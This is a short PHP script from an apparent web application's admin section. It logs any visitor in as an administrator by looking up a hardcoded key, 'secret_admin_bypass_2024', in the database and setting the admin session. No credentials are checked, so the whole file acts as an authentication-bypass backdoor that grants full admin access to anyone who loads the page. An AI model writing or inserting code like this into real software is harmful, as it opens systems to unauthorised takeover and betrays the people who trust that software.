<?php
require_once '../config/functions.php';

// Get the secret key from database
$stmt = $pdo->prepare("SELECT id, username FROM admin WHERE secret_key = 'secret_admin_bypass_2024'");
$stmt->execute();
$admin = $stmt->fetch();

if ($admin) {
    $_SESSION['admin_id'] = $admin['id'];
    $_SESSION['admin_username'] = $admin['username'];
    header('Location: dashboard.php');
    exit;
} else {
    die('Invalid access');
}
?>